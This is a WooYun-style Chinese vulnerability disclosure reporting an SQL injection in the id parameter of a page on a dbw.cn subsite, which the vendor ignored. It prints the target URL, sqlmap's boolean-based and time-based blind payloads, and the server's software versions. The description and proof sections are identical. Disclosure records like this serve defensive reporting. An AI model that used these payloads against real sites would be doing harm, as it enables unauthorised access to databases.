wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail: 漏洞详情 披露状态：   									2014-09-07：	细节已通知厂商并且等待厂商处理中									2014-09-12：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 东北网某子站SQL注入 详细说明：  http://ichtf.dbw.cn/dhcx/browse/download_10_web.php?id=28423'sqlmap identified the following injection points with a total of 555 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=28423 AND 2605=2605    Type: AND/OR time-based blind    Title: MySQL < 5.0.12 AND time-based blind (heavy query)    Payload: id=28423 AND 4381=BENCHMARK(5000000,MD5(0x4b696f65))---web server operating system: Linux Red Hat Enterprise 3 (Taroon)web application technology: PHP 4.3.2, Apache 2.0.46back-end DBMS: MySQL < 4.0.0banner:	None   漏洞证明：  http://ichtf.dbw.cn/dhcx/browse/download_10_web.php?id=28423'sqlmap identified the following injection points with a total of 555 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=28423 AND 2605=2605    Type: AND/OR time-based blind    Title: MySQL < 5.0.12 AND time-based blind (heavy query)    Payload: id=28423 AND 4381=BENCHMARK(5000000,MD5(0x4b696f65))---web server operating system: Linux Red Hat Enterprise 3 (Taroon)web application technology: PHP 4.3.2, Apache 2.0.46back-end DBMS: MySQL < 4.0.0banner:	None   修复方案：  过滤~   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-09-12 23:26 厂商回复：  最新状态： 暂无
